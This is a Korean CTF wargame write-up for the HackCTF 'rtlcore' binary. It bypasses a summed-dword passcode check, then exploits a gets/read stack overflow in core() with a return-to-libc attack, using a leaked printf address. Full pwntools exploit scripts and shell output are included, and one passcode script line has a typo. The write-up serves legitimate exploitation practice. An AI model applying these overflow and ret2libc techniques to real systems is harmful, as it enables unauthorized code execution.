# RTL_Core

```c
kimdong@ubuntu  ~/Wargame/200~250  file rtlcore
rtlcore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=fa498ff4575e4f3bbca6fa07300ef79f319cfa04, not stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec rtlcore
[*] '/home/kimdong/Wargame/200~250/rtlcore'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
```
이번 바이너리 파일은 32bit로 mitigation은 NX-bit가 설정되어있다.<br>
추가적으로 libc파일도 동봉이 되어있다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./rtlcore
코어 파일에 액세스중입니다...
패스코드를 입력해주세요
Passcode: 1234
실패!
```
실행시켜보면, 문자열이 출력되고 사용자의 입력값을 받은후에, 검증하여 문자열을 다시 출력해주는 형식이다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-1Ch]

  setvbuf(_bss_start, 0, 2, 0);
  puts(&::s);
  printf("Passcode: ");
  gets(&s);
  if ( check_passcode(&s) == hashcode )
  {
    puts(&byte_8048840);
    core();
  }
  else
  {
    puts(&byte_8048881);
  }
  return 0;
}
```
main문은 다음과 같은 형식이다.<br>

사용자에게 gets를 통해 입력을 받고, `check_passcode`라는 함수를 통해 계산을 한 뒤에, hashcode와 비교를 한다.<br>

일치하는 경우에는 `core()`라는 함수를 실행시켜준다.<br>


```c
int __cdecl check_passcode(int a1)
{
  int v2; // [esp+8h] [ebp-8h]
  signed int i; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}
```

`check_passcode`함수는 위와 같다.<br>

for문을 돌면서 받은 주소값에 `4byte*i`를 더해서 5번 더해서 v2에 넣어주는 형식이다.<br>

`data:0804A030 hashcode        dd 0C0D9B0A7`<br>

ida로 확인한 `hashcode`의 값은 `0x0c0d9b0a7`이다.<br>

따라서, 4byte씩 주소값을 증가시키면서 받아오는 형식이므로, `0x0c0d9b0a7`를 5로 나눠서 보내면된다.<br>
`0c0d9b0a7`은 5로 정확히 나눠지지 않으므로, 마지막 payload에 2를 더해서 보내주면 된다.<br>

## Passcode
```c
from pwn import *
p = process("./rtlcore")
payload = p32(0x2691f021)*4
payload += p32(0x2691f023_
p.recvuntil("Passcode: ")
p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame/200~250  python passcoe.py
[+] Starting local process './rtlcore': pid 8731
[*] Switching to interactive mode
코드가 일치하구나. 좋아, 다음 단서를 던져주지
너에게 필요한 것은 바로 0xf7e14b60 일거야
```
위의 코드를 실행시키면 `0xf7e14b60`라는 주소를 준다.<br>

```c
ssize_t core()
{
  int buf; // [esp+Ah] [ebp-3Eh]
  int v2; // [esp+Eh] [ebp-3Ah]
  __int16 v3; // [esp+12h] [ebp-36h]
  int v4; // [esp+38h] [ebp-10h]
  void *v5; // [esp+3Ch] [ebp-Ch]

  buf = 0;
  v2 = 0;
  v4 = 0;
  memset(
    (void *)((unsigned int)&v3 & 0xFFFFFFFC),
    0,
    4 * (((unsigned int)((char *)&v2 - ((unsigned int)&v3 & 0xFFFFFFFC) + 46) & 0xFFFFFFFC) >> 2));
  v5 = dlsym((void *)0xFFFFFFFF, "printf");
  printf(&format, v5);
  return read(0, &buf, 0x64u);
}
```
`passcode`를 맞췄으니 실행시키는 `core()` 함수를 보도록하자.<br>

`core()`함수에서 buf의 크기는 62byte지만, read를 통해 100byte를 받아오므로, BOF를 사용하여, ret주소를 조작할 수있다.<br>

`core()`함수에서 보면 위에서 받은 주소는 `printf함수`이다.<br>

따라서 printf함수를 통해 `libc_base`를 구하고, system함수의 주소를 구해서, /bin/bash문자열을 입력하여 쉘을 띄워보자.<br>

`libc_base = printf_addr - libc.symbol['printf']`<br>

`system_addr = libc_base + libc.symbol['system']`<br>

`binsh_addr = libc_base + list(libc.search("/bin/sh"))[0]`<br>

위와 같이 `binsh_addr`을 구할수 있다.<br>

---

## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3015)
e = ELF("./rtlcore")
libc = ELF("./libc.so.6")

payload = p32(0x2691f021)*4
payload += p32(0x2691f023)
p.recvuntil("Passcode: ")
p.sendline(payload)

p.recvuntil("0x")
printf_addr = int(p.recv(8),16)

libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + list(libc.search("/bin/sh"))[0]


payload2 = "A"*66
payload2 += p32(system_addr)
payload2 += "A"*4
payload2 += p32(binsh_addr)

p.sendline(payload2)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame/200~250  python rtlcore_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3015: Done
[*] '/home/kimdong/Wargame/200~250/rtlcore'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
[*] '/home/kimdong/Wargame/200~250/libc.so.6'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled
[*] Switching to interactive mode
일거야
$ ls
flag
main
$ cat flag
HackCTF{}
```
